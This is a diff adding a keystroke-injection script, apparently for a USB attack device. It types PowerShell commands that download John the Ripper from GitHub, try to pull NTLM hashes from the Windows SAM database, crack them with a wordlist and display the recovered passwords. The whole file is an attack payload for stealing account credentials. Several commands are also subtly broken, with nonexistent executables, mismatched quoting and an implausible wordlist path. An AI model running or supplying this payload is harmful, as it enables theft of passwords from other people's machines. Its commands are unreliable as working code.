@@ -1,0 +1,62 @@
+REM ============================================================
+REM   John the Ripper - Password Hash Cracker
+REM   Downloads John portable, extracts hashes from target, cracks them
+REM
+REM   Steps:
+REM     1. Download John the Ripper portable (Jumbo version)
+REM     2. Extract NTLM hashes from SAM database or mimikatz output
+REM     3. Run John against the hashes with built-in wordlist
+REM ============================================================
+
+DELAY 2000
+
+STRING powershell -NoProfile -Command "$ProgressPreference = 'SilentlyContinue'; $env:TEMP"
+ENTER
+DELAY 1000
+
+STRING mkdir "$env:TEMP\john" -Force
+ENTER
+DELAY 500
+
+STRING cd "$env:TEMP\john"
+ENTER
+DELAY 200
+
+REM Download John the Ripper Jumbo portable (7-Zip archive)
+STRING powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://github.com/JohnTheRipper/John/releases/download/Beta-Jumbo-1.9.0-john-1.9.0/John-the-Ripper-Beta-Jumbo-1.9.0.zip' -OutFile 'john.zip'"
+ENTER
+DELAY 15000
+
+REM Extract John (uses built-in PowerShell extraction)
+STRING powershell -NoProfile -Command "Expand-Archive -Path '$env:TEMP\john\john.zip' -DestinationPath '$env:TEMP\john\' -Force"
+ENTER
+DELAY 5000
+
+REM Find the actual directory name (it varies by release)
+STRING powershell -NoProfile -Command "$dir = Get-ChildItem '$env:TEMP\john' -Directory | Select-Object -First 1; if ($dir) { echo $dir.Name } else { echo 'John-the-Ripper-Beta-Jumbo-1.9.0' }"
+ENTER
+DELAY 500
+
+STRING powershell -NoProfile -Command "$d = (Get-ChildItem '$env:TEMP\john' -Directory)[0].Name; cd \"$env:TEMP\\john\\$d\"; if (Test-Path 'run\win\run64.exe') { echo '64-bit John found' } elseif (Test-Path 'run\win\run32.exe') { echo '32-bit John found' } else { echo 'John extracted OK' }"
+ENTER
+DELAY 1000
+
+REM Extract NTLM hashes from SAM database using samdump2 or secretsdump approach
+STRING powershell -NoProfile -Command "cd \"$env:TEMP\\john\"; $d = (Get-ChildItem '.' -Directory)[0].Name; cd \"$d\"; if (Test-Path 'run\win\run64.exe') { & '.\run\win\run64.exe' ntlm '$env:WINDIR'\System32\config\SAM' 2>&1 | Select-Object -First 50 }"
+ENTER
+DELAY 5000
+
+REM Save hashes to a file for cracking
+STRING powershell -NoProfile -Command "$d = (Get-ChildItem '$env:TEMP\john' -Directory)[0].Name; cd \"$env:TEMP\\john\\$d\"; & '.\run\win\run64.exe' ntlm '$env:WINDIR'\System32\config\SAM' 2>&1 | Out-File 'hashes.txt'"
+ENTER
+DELAY 5000
+
+REM Run John to crack the hashes (uses built-in wordlist by default)
+STRING powershell -NoProfile -Command "$d = (Get-ChildItem '$env:TEMP\john' -Directory)[0].Name; cd \"$env:TEMP\\john\\$d\"; & '.\run\win\run64.exe' --wordlist:'run\wordlists\password-cracker\dictionaries\dist\rockyou.txt' hashes.txt 2>&1 | Out-File 'cracked.txt'; echo 'John the Ripper complete!'"
+ENTER
+DELAY 30000
+
+REM Show cracked passwords
+STRING powershell -NoProfile -Command "if (Test-Path '$env:TEMP\john\cracked.txt') { Get-Content '$env:TEMP\john\cracked.txt' } else { echo 'John extraction failed.' }"
+ENTER
+SLEEP 3000
